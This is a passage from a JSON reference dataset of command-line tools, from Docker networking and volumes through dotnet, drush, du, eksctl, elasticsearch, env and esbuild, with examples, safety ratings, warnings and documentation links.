        "relationship": "alternative",
        "reason": "Kubernetes offers more advanced orchestration features"
      },
      {
        "name": "docker-stack",
        "relationship": "enhanced",
        "reason": "Docker Stack deploys Compose files on Swarm clusters"
      }
    ],
    "warnings": [
      "Compose v2 has different behavior than v1 in some scenarios",
      "Resource limits in Compose files may not be enforced without Swarm mode",
      "Network isolation differs between Compose and production orchestrators"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/compose/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/compose/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/compose/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/compose/production/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "docker-network-advanced",
    "subtitle": "Docker Network Management",
    "description": "Advanced Docker networking for container communication",
    "examples": [
      "docker network create --driver bridge --subnet=172.20.0.0/16 --ip-range=172.20.240.0/20 my-network  # Create custom bridge network with specific subnet and IP range",
      "docker network create --driver overlay --attachable --subnet=10.10.0.0/16 swarm-network  # Create overlay network for Docker Swarm with custom subnet",
      "docker network connect --ip=172.20.0.100 my-network my-container  # Connect running container to network with specific IP address",
      "docker network create --driver bridge --opt com.docker.network.bridge.name=custom0 --dns=8.8.8.8 custom-net  # Create network with custom bridge name and DNS settings",
      "docker network inspect --format='{{json .IPAM.Config}}' my-network  # Inspect network IPAM configuration in JSON format",
      "docker network create -d macvlan --subnet=192.168.1.0/24 --gateway=192.168.1.1 -o parent=eth0 pub-net  # Create macvlan network for containers to appear on physical network",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "docker network <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Multi-tier application networking",
        "commands": "docker network create frontend && docker network create backend && docker run -d --network frontend --name web nginx && docker run -d --network backend --name db postgres && docker network connect backend web",
        "explanation": "Create separate networks for tiers and connect web server to both",
        "title": "docker && docker && docker && docker && docker"
      },
      {
        "scenario": "Network troubleshooting",
        "commands": "docker network ls && docker network inspect bridge && docker run --rm --network container:web nicolaka/netshoot",
        "explanation": "List networks, inspect default bridge, and run network troubleshooting container",
        "title": "docker && docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-run",
        "relationship": "combo",
        "reason": "Run containers with specific network configurations"
      },
      {
        "name": "kubectl-networking",
        "relationship": "similar",
        "reason": "Kubernetes networking concepts and commands"
      },
      {
        "name": "iptables",
        "relationship": "underlying",
        "reason": "Docker networking uses iptables for traffic management"
      }
    ],
    "warnings": [
      "Custom networks provide automatic DNS resolution between containers",
      "Overlay networks require Docker Swarm mode or external key-value store",
      "Network drivers have different capabilities and limitations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/engine/reference/commandline/network/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/engine/reference/commandline/network/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/engine/reference/commandline/network/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/network/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "docker-run-advanced",
    "subtitle": "Docker Run with Advanced Options",
    "description": "Run Docker containers with advanced configuration options",
    "examples": [
      "docker run --memory=2g --cpus=1.5 --name myapp nginx  # Start container with 2GB RAM and 1.5 CPU core limits",
      "docker run -d -v /host/data:/app/data -e NODE_ENV=production --restart=unless-stopped node:18  # Run container with persistent volume, environment variable, and restart policy",
      "docker run -d --network=my-network --ip=172.18.0.100 --hostname=web-server nginx  # Run container on custom network with specific IP and hostname",
      "docker run --user=1000:1000 --read-only --security-opt=no-new-privileges alpine  # Run container as non-root user with read-only filesystem and security restrictions",
      "docker run -d --health-cmd='curl -f http://localhost:8080/health' --health-interval=30s nginx  # Run container with custom health check every 30 seconds",
      "docker run -d --tmpfs /tmp:noexec,nosuid,size=100m nginx  # Run container with temporary filesystem mount with restrictions",
      "docker run -it --device=/dev/snd --group-add audio ubuntu  # Run container with access to sound devices and audio group",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "docker run [options] <image> [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production web application deployment",
        "commands": "docker run -d --name web-app --memory=4g --cpus=2 --restart=always -p 80:8080 -v /var/log/app:/app/logs -e NODE_ENV=production myapp:latest",
        "explanation": "Deploy production container with resource limits, logging, and restart policy",
        "title": "docker"
      },
      {
        "scenario": "Database container with persistence",
        "commands": "docker run -d --name postgres-db --memory=2g -v postgres-data:/var/lib/postgresql/data -e POSTGRES_PASSWORD=secret --restart=unless-stopped postgres:14",
        "explanation": "Run database container with persistent storage and memory limits",
        "title": "docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-exec",
        "relationship": "combo",
        "reason": "Execute commands in running containers"
      },
      {
        "name": "docker-logs",
        "relationship": "combo",
        "reason": "View container output and debugging"
      },
      {
        "name": "kubectl-run",
        "relationship": "similar",
        "reason": "Kubernetes equivalent for running containers"
      }
    ],
    "warnings": [
      "Resource limits only work on supported Docker engines",
      "Volume mounts can have permission issues across different host systems",
      "Network settings may conflict with existing Docker networks"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/engine/reference/commandline/run/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/engine/reference/commandline/run/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/engine/reference/commandline/run/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/engine/reference/run/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "docker-swarm-orchestration",
    "subtitle": "Docker Swarm Orchestration",
    "description": "Docker Swarm cluster orchestration and management",
    "examples": [
      "docker swarm init --advertise-addr 192.168.1.100 --listen-addr 0.0.0.0:2377  # Initialize Swarm manager with specific advertise and listen addresses",
      "docker service create --name web --replicas 3 --update-parallelism 1 --update-delay 10s --restart-condition on-failure nginx  # Create service with rolling update configuration and restart policy",
      "docker stack deploy -c docker-compose.yml --with-registry-auth myapp  # Deploy application stack with registry authentication",
      "docker service scale web=5 api=3 worker=2  # Scale multiple services simultaneously",
      "docker service create --constraint 'node.role==worker' --constraint 'node.labels.zone==us-west' nginx  # Create service with node placement constraints",
      "docker service update --image nginx:1.21 --health-cmd 'curl -f http://localhost/' --health-interval 30s web  # Update service image with health check configuration",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "docker swarm|service|stack <command> [options]",
    "prerequisites": [
      "docker-engine"
    ],
    "commandCombinations": [
      {
        "scenario": "High availability setup",
        "commands": "docker swarm init --advertise-addr $(hostname -I | cut -d' ' -f1) && docker node update --availability drain $(hostname) && docker service create --replicas 3 --constraint 'node.role==worker' nginx",
        "explanation": "Initialize Swarm, drain manager, and deploy service on workers only",
        "title": "docker | cut && docker && docker"
      },
      {
        "scenario": "Service monitoring and debugging",
        "commands": "docker service ls && docker service ps web --no-trunc && docker service logs -f web",
        "explanation": "List services, inspect service tasks, and follow service logs",
        "title": "docker && docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "similar",
        "reason": "Kubernetes provides similar orchestration capabilities"
      },
      {
        "name": "docker-compose",
        "relationship": "combo",
        "reason": "Compose files can be deployed as Swarm stacks"
      },
      {
        "name": "consul",
        "relationship": "combo",
        "reason": "Can be used for service discovery in Swarm clusters"
      }
    ],
    "warnings": [
      "Swarm mode changes Docker daemon behavior significantly",
      "Ingress network can cause port conflicts on overlay networks",
      "Rolling updates may cause temporary service unavailability"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/engine/swarm/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/engine/swarm/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/engine/swarm/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/engine/swarm/swarm-tutorial/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "docker-volume-management",
    "subtitle": "Docker Volume Management",
    "description": "Advanced Docker volume and data management",
    "examples": [
      "docker volume create --driver local --opt type=tmpfs --opt device=tmpfs --opt o=size=100m temp-volume  # Create temporary volume in memory with size limit",
      "docker volume create --driver local --opt type=nfs --opt o=addr=192.168.1.100,rw --opt device=:/path/to/dir nfs-volume  # Create volume backed by NFS share",
      "docker run --rm -v postgres-data:/data -v $(pwd):/backup alpine tar czf /backup/postgres-backup.tar.gz -C /data .  # Create compressed backup of volume data",
      "docker run --rm -v postgres-data:/data -v $(pwd):/backup alpine tar xzf /backup/postgres-backup.tar.gz -C /data  # Restore volume data from compressed backup",
      "docker run --rm -v source-volume:/source -v target-volume:/target alpine cp -a /source/. /target/  # Copy all data from source volume to target volume",
      "docker volume inspect --format='{{.Mountpoint}}' my-volume  # Get the host filesystem path of a Docker volume",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "docker volume <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Database volume management",
        "commands": "docker volume create postgres-data && docker run -d -v postgres-data:/var/lib/postgresql/data postgres:14 && docker volume inspect postgres-data",
        "explanation": "Create volume, use it with database container, and inspect configuration",
        "title": "docker && docker && docker"
      },
      {
        "scenario": "Volume cleanup and maintenance",
        "commands": "docker volume ls -f dangling=true && docker volume prune -f && docker system df",
        "explanation": "List dangling volumes, remove them, and check disk usage",
        "title": "docker && docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-run",
        "relationship": "combo",
        "reason": "Mount volumes in containers"
      },
      {
        "name": "kubectl-pv",
        "relationship": "similar",
        "reason": "Kubernetes persistent volume management"
      },
      {
        "name": "rsync",
        "relationship": "alternative",
        "reason": "Alternative for syncing data between volumes"
      }
    ],
    "warnings": [
      "Anonymous volumes are created automatically but hard to manage",
      "Volume drivers may have specific requirements and limitations",
      "Volume data persists even after container removal unless explicitly deleted"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/engine/reference/commandline/volume/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/engine/reference/commandline/volume/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/engine/reference/commandline/volume/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/storage/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "dotnet",
    "subtitle": ".NET CLI",
    "description": ".NET CLI tools for creating, building, and running .NET applications",
    "examples": [
      "dotnet new console -n MyApp  # Create new .NET console application named MyApp",
      "dotnet build  # Build project in current directory",
      "dotnet run  # Run project from source code",
      "dotnet add package Newtonsoft.Json  # Add Newtonsoft.Json NuGet package to project",
      "dotnet test  # Run unit tests in current solution",
      "dotnet publish -c Release  # Publish application for deployment in Release mode",
      "dotnet watch run  # Run project with automatic restart on file changes for development",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "dotnet <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create and run web API",
        "commands": "dotnet new webapi -n MyAPI && cd MyAPI && dotnet run",
        "explanation": "Create new Web API project and start development server",
        "title": "dotnet && cd && dotnet"
      },
      {
        "scenario": "Build and test pipeline",
        "commands": "dotnet restore && dotnet build && dotnet test",
        "explanation": "Complete CI/CD build pipeline",
        "title": "dotnet && dotnet && dotnet"
      }
    ],
    "relatedCommands": [
      {
        "name": "nuget",
        "relationship": "combo",
        "reason": ".NET package manager integrated with dotnet CLI"
      },
      {
        "name": "msbuild",
        "relationship": "underlying",
        "reason": "MSBuild is used under the hood for building"
      }
    ],
    "warnings": [
      "Different .NET versions may require different CLI versions",
      "Global tools installation path may need to be in PATH",
      "Project file format changed between .NET Framework and .NET Core"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.microsoft.com/en-us/dotnet/core/tools/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "drush",
    "subtitle": "Drupal Shell",
    "description": "Drush command line shell and Unix scripting interface for Drupal",
    "examples": [
      "drush cache:rebuild  # Clears and rebuilds all Drupal caches",
      "drush pm:enable views  # Enables the Views module in Drupal",
      "drush updatedb  # Runs pending database updates after module updates",
      "drush sql:dump > backup.sql  # Exports Drupal database to SQL file",
      "drush pm:install webform  # Downloads and enables the Webform module",
      "drush config:export  # Export active configuration to sync directory",
      "drush user:login --name=admin  # Generate one-time login link for admin user"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "drush [command] [options]",
    "prerequisites": [
      "php",
      "composer",
      "drupal"
    ],
    "commandCombinations": [
      {
        "scenario": "Module update workflow",
        "commands": "drush sql:dump > backup.sql && drush pm:update-code && drush updatedb && drush cache:rebuild",
        "explanation": "Backs up database, updates module code, runs updates, and clears cache",
        "title": "drush > backup && drush && drush && drush"
      },
      {
        "scenario": "Site maintenance mode",
        "commands": "drush state:set system.maintenance_mode TRUE && drush cache:rebuild && drush state:set system.maintenance_mode FALSE",
        "explanation": "Puts site in maintenance mode, performs operations, then takes it out of maintenance",
        "title": "drush && drush && drush"
      }
    ],
    "relatedCommands": [
      {
        "name": "composer",
        "relationship": "package-manager",
        "reason": "Drush and Drupal modules are often managed via Composer"
      },
      {
        "name": "php",
        "relationship": "dependency",
        "reason": "Drupal and Drush require PHP runtime"
      },
      {
        "name": "mysql",
        "relationship": "complement",
        "reason": "Drupal typically uses MySQL/MariaDB for database operations"
      }
    ],
    "warnings": [
      "Must be run from Drupal installation directory",
      "Different Drush versions support different Drupal versions",
      "Some commands require specific user permissions",
      "Cache clearing is often needed after configuration changes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.drush.org/en/latest/install/"
      },
      {
        "platform": "macos",
        "url": "https://docs.drush.org/en/latest/install/"
      },
      {
        "platform": "windows",
        "url": "https://docs.drush.org/en/latest/install/"
      },
      {
        "platform": "generic",
        "url": "https://drushcommands.com/"
      }
    ],
    "distroNotes": {
      "windows": "Available through Composer, requires PHP and proper PATH",
      "linux": "Available through package managers or Composer",
      "macos": "Available through Homebrew or Composer"
    }
  },
  {
    "name": "dstat",
    "subtitle": "Dynamic Statistics",
    "description": "Versatile system resource statistics tool",
    "examples": [
      "dstat  # Show CPU, disk, network, paging, and system statistics",
      "dstat -c  # Display only CPU usage statistics",
      "dstat -n  # Show network send/receive statistics",
      "dstat -m -s  # Display memory usage and swap statistics",
      "dstat 5 12  # Display statistics every 5 seconds for 12 intervals",
      "dstat --top-cpu --top-mem  # Show processes using most CPU and memory",
      "dstat -cdngy --output system-stats.csv  # Export comprehensive stats to CSV file"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "dstat [options] [interval] [count]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive system monitoring",
        "commands": "dstat -cdngy 2 30 > system_stats.txt",
        "explanation": "Monitor CPU, disk, network, paging for 1 minute",
        "title": "dstat > system_stats"
      }
    ],
    "relatedCommands": [
      {
        "name": "vmstat",
        "relationship": "similar",
        "reason": "Both provide system statistics but dstat is more colorful"
      },
      {
        "name": "iostat",
        "relationship": "similar",
        "reason": "Both show I/O statistics with different presentations"
      }
    ],
    "warnings": [
      "Linux-specific tool, deprecated in favor of newer alternatives",
      "Colorful output may not work in all terminals",
      "May not be maintained in recent distributions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/dstat.1.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "du",
    "subtitle": "disk usage",
    "description": "Display directory and file disk usage",
    "examples": [
      "du -h --max-depth=1 | sort -hr  # Show directory sizes at current level, sorted by size",
      "du -sh /var/log  # Show total size of directory in human-readable format",
      "du -ah | grep '[0-9]\\+G'  # Show all files and directories larger than 1GB",
      "du -sh --exclude='*.tmp' project/  # Calculate directory size excluding temporary files",
      "du -sh */ | sort -hr  # Display and sort all subdirectory sizes",
      "du -ck * | tail -1  # Show total disk usage of current directory in KB",
      "find . -size +100M -exec du -h {} \\; | sort -hr  # Find and display files larger than 100MB"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "du [options] [directory]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and clean up large files",
        "commands": "du -ah | sort -hr | head -20",
        "explanation": "Show 20 largest files and directories",
        "title": "du | sort | head"
      },
      {
        "scenario": "Disk usage report with date",
        "commands": "echo \"Disk usage report - $(date)\" && du -sh */ | sort -hr",
        "explanation": "Generate dated disk usage report",
        "title": "echo && du | sort"
      }
    ],
    "relatedCommands": [
      {
        "name": "df",
        "relationship": "combo",
        "reason": "Use df to see filesystem usage, du to find what's using space"
      },
      {
        "name": "ncdu",
        "relationship": "alternative",
        "reason": "Interactive disk usage browser with navigation"
      },
      {
        "name": "dust",
        "relationship": "alternative",
        "reason": "Modern du replacement with better visualization"
      }
    ],
    "warnings": [
      "du can be slow on directories with many files",
      "Symbolic links are not followed by default",
      "du shows apparent size, which may differ from actual disk usage"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/du.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/du.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only"
    }
  },
  {
    "name": "duplicity",
    "subtitle": "Duplicity",
    "description": "Encrypted bandwidth-efficient backup using rsync algorithm",
    "examples": [
      "duplicity full /home/user/ file:///backup/user/  # Create full encrypted backup to local directory",
      "duplicity incr /home/user/ file:///backup/user/  # Create incremental backup of changes since last backup",
      "duplicity /home/user/ s3://mybucket/backup/  # Backup to Amazon S3 bucket",
      "duplicity list-current-files file:///backup/user/  # List files in most recent backup",
      "duplicity restore file:///backup/user/ /restore/location/  # Restore entire backup to specified location",
      "duplicity remove-older-than 6M file:///backup/user/  # Remove backups older than 6 months",
      "duplicity verify file:///backup/user/ /home/user/  # Compare backup with source directory to verify integrity"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "duplicity [options] source_url target_url",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated backup strategy",
        "commands": "duplicity incr /home/user/ file:///backup/user/ && duplicity remove-older-than 3M file:///backup/user/ && duplicity collection-status file:///backup/user/",
        "explanation": "Incremental backup, cleanup old backups, show status",
        "title": "duplicity && duplicity && duplicity"
      }
    ],
    "relatedCommands": [
      {
        "name": "rsync",
        "relationship": "similar",
        "reason": "Both provide incremental backup capabilities"
      },
      {
        "name": "gpg",
        "relationship": "combo",
        "reason": "Duplicity uses GPG for encryption"
      }
    ],
    "warnings": [
      "Requires GPG key setup for encryption",
      "Full backup needed periodically"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://duplicity.nongnu.org/duplicity.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "dust",
    "subtitle": "dust",
    "description": "Intuitive du alternative with visual disk usage display",
    "examples": [
      "dust  # Display disk usage with bar charts and colors",
      "dust -d 2  # Show only 2 levels deep in directory tree",
      "dust -s  # Display file sizes rather than blocks used",
      "dust -r  # Show largest directories first",
      "dust -t 100M  # Only show directories larger than 100MB",
      "dust -b  # Display sizes in bytes instead of human-readable format",
      "dust -f  # Display full path names instead of just directory names"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "dust [options] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find space hogs in specific directory",
        "commands": "dust -d 3 /var/log | head -20",
        "explanation": "Analyze log directory usage with limited depth",
        "title": "dust | head"
      },
      {
        "scenario": "Compare disk usage across filesystems",
        "commands": "dust /home /var /tmp",
        "explanation": "Compare usage across multiple directories",
        "title": "dust"
      }
    ],
    "relatedCommands": [
      {
        "name": "du",
        "relationship": "alternative",
        "reason": "Traditional disk usage tool, dust has better visualization"
      },
      {
        "name": "ncdu",
        "relationship": "similar",
        "reason": "Interactive disk usage analyzer"
      },
      {
        "name": "df",
        "relationship": "combo",
        "reason": "df shows filesystem usage, dust shows directory usage"
      }
    ],
    "warnings": [
      "Colors may not display correctly in all terminals",
      "Large directories can take time to analyze",
      "Bar chart scale adjusts based on largest directory"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/bootandy/dust"
      },
      {
        "platform": "macos",
        "url": "https://github.com/bootandy/dust"
      },
      {
        "platform": "windows",
        "url": "https://github.com/bootandy/dust"
      },
      {
        "platform": "generic",
        "url": "https://github.com/bootandy/dust#usage"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "eksctl",
    "subtitle": "EKS Control",
    "description": "Simple CLI tool for creating and managing EKS clusters",
    "examples": [
      "eksctl create cluster --name production-cluster --version 1.27 --region us-west-2 --nodegroup-name workers --node-type m5.large --nodes 3 --nodes-min 1 --nodes-max 10  # Create EKS cluster with managed node group and auto-scaling",
      "eksctl create cluster -f cluster.yaml  # Create cluster using YAML configuration file",
      "eksctl create nodegroup --cluster production-cluster --name spot-workers --node-type m5.large --nodes 2 --spot  # Add Spot instance node group to existing cluster",
      "eksctl update cluster --name production-cluster --approve  # Update cluster to latest supported Kubernetes version",
      "eksctl delete cluster --name production-cluster --wait  # Delete EKS cluster and all associated resources",
      "eksctl create iamserviceaccount --cluster production-cluster --namespace kube-system --name aws-load-balancer-controller --attach-policy-arn arn:aws:iam::aws:policy/ElasticLoadBalancingFullAccess  # Create service account with IAM role for AWS Load Balancer Controller",
      "eksctl utils update-cluster-logging --enable-types all --cluster production-cluster --approve  # Enable all CloudWatch logging types for EKS cluster",
      "eksctl scale nodegroup --cluster production-cluster --name workers --nodes 5 --nodes-min 3 --nodes-max 10  # Scale existing node group with new size constraints"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "eksctl [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete production cluster setup",
        "commands": "eksctl create cluster -f production-cluster.yaml && eksctl create iamserviceaccount --cluster production --namespace kube-system --name cluster-autoscaler --attach-policy-arn arn:aws:iam::aws:policy/AutoScalingFullAccess",
        "explanation": "Create cluster from config and set up cluster autoscaler service account",
        "title": "eksctl && eksctl"
      },
      {
        "scenario": "Cluster upgrade workflow",
        "commands": "eksctl get cluster --name production && eksctl update cluster --name production --approve && eksctl update nodegroup --cluster production --name workers",
        "explanation": "Check cluster status, update control plane, then update worker nodes",
        "title": "eksctl && eksctl && eksctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "kubectl manages applications on EKS clusters created by eksctl"
      },
      {
        "name": "aws",
        "relationship": "combo",
        "reason": "eksctl uses AWS CLI credentials and APIs"
      }
    ],
    "warnings": [
      "Requires AWS CLI configuration and appropriate IAM permissions",
      "Node groups use CloudFormation stacks for management",
      "Cluster deletion may take 10-15 minutes to complete",
      "Some operations require cluster to be in ACTIVE state"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://eksctl.io/"
      },
      {
        "platform": "macos",
        "url": "https://eksctl.io/"
      },
      {
        "platform": "windows",
        "url": "https://eksctl.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "elasticsearch",
    "subtitle": "Elasticsearch Search Engine",
    "description": "Distributed search and analytics engine for log aggregation",
    "examples": [
      "elasticsearch  # Start Elasticsearch server with default settings",
      "elasticsearch -Ecluster.name=my-cluster  # Start with custom cluster name",
      "elasticsearch -Enode.name=node-1  # Start with custom node name",
      "elasticsearch -Expack.security.enabled=false  # Start with security features disabled",
      "elasticsearch -d  # Start Elasticsearch as daemon process in background",
      "elasticsearch -Epath.data=/custom/data -Epath.logs=/custom/logs  # Start with custom data and log directories",
      "elasticsearch -Ehttp.port=9250  # Start Elasticsearch on custom HTTP port 9250"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "elasticsearch [options]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Development cluster setup",
        "commands": "elasticsearch -Ecluster.name=dev-cluster -Enode.name=dev-node -Enetwork.host=0.0.0.0",
        "explanation": "Development Elasticsearch accessible from network",
        "title": "elasticsearch"
      }
    ],
    "relatedCommands": [
      {
        "name": "kibana",
        "relationship": "combo",
        "reason": "Kibana provides visualization for Elasticsearch data"
      },
      {
        "name": "logstash",
        "relationship": "combo",
        "reason": "Logstash processes logs and sends to Elasticsearch"
      }
    ],
    "warnings": [
      "Requires Java 8 or later",
      "Default ports are 9200 (HTTP) and 9300 (transport)",
      "Memory usage can be significant"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.elastic.co/guide/en/elasticsearch/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "emacs",
    "subtitle": "Editor MACroS",
    "description": "Extensible text editor and computing environment",
    "examples": [
      "emacs filename.txt  # Open file in Emacs editor",
      "emacs -nw filename.txt  # Run Emacs in terminal without GUI",
      "emacs --batch --eval '(message \"Hello World\")'  # Run Emacs in batch mode for scripting",
      "emacs -q --load custom.el filename.txt  # Start Emacs without init file, load custom config",
      "emacs --daemon  # Start Emacs server daemon for faster client connections",
      "emacsclient filename.txt  # Connect to running Emacs daemon to edit file",
      "emacs -nw +25 source.py  # Open file at line 25 in terminal mode"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "emacs [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Programming workflow",
        "commands": "emacs project.py && emacs Makefile",
        "explanation": "Edit Python file and build configuration",
        "title": "emacs && emacs"
      }
    ],
    "relatedCommands": [
      {
        "name": "vim",
        "relationship": "alternative",
        "reason": "Alternative powerful text editor with modal approach"
      }
    ],
    "warnings": [
      "Complex key bindings using Ctrl and Meta keys",
      "Highly customizable but can be overwhelming"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/emacs/manual/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/emacs/manual/"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/emacs/manual/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "env",
    "subtitle": "environment",
    "description": "Display environment variables or run command with modified environment",
    "examples": [
      "env  # Show all current environment variables and their values",
      "env -i /bin/bash  # Start new shell with empty environment",
      "env DEBUG=1 ./script.sh  # Run script with DEBUG environment variable set",
      "env -u HOME pwd  # Run command with HOME variable removed from environment",
      "env | sort  # Display environment variables in alphabetical order",
      "env NODE_ENV=production npm start  # Run Node.js application with production environment",
      "env -S 'JAVA_OPTS=-Xmx2g -Xms1g' java -jar app.jar  # Set JVM options via environment"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "env [options] [variable=value] [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find environment variables containing pattern",
        "commands": "env | grep -i path",
        "explanation": "Show all environment variables with 'path' in name or value",
        "title": "env | grep"
      },
      {
        "scenario": "Run program with custom library path",
        "commands": "env LD_LIBRARY_PATH=/usr/local/lib ./myprogram",
        "explanation": "Set library path for specific program execution",
        "title": "env"
      }
    ],
    "relatedCommands": [
      {
        "name": "export",
        "relationship": "similar",
        "reason": "Shell builtin to set environment variables permanently"
      },
      {
        "name": "printenv",
        "relationship": "similar",
        "reason": "Display specific environment variable values"
      },
      {
        "name": "set",
        "relationship": "broader",
        "reason": "Display and set shell variables and options"
      }
    ],
    "warnings": [
      "env changes only affect the command being run, not current shell",
      "Variable assignments must come before command name",
      "Different from shell's export command which affects current session"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/env.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/env.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/env-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "esbuild",
    "subtitle": "ESBuild",
    "description": "Extremely fast JavaScript bundler and minifier",
    "examples": [
      "esbuild app.js --bundle --outfile=out.js  # Bundle app.js and dependencies into single file",
      "esbuild app.js --bundle --minify --outfile=app.min.js  # Create minified bundle for production",
      "esbuild app.js --bundle --outfile=out.js --watch  # Bundle and rebuild on file changes",
      "esbuild app.js --bundle --outfile=out.js --servedir=public  # Bundle and serve files via HTTP server",
      "esbuild app.ts --bundle --outfile=out.js  # Compile TypeScript and bundle in one step",
      "esbuild src/index.js --bundle --splitting --outdir=dist --format=esm  # Create multiple chunks with code splitting",
      "esbuild app.jsx --bundle --loader:.png=dataurl --outfile=app.js  # Bundle React with embedded PNG assets"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
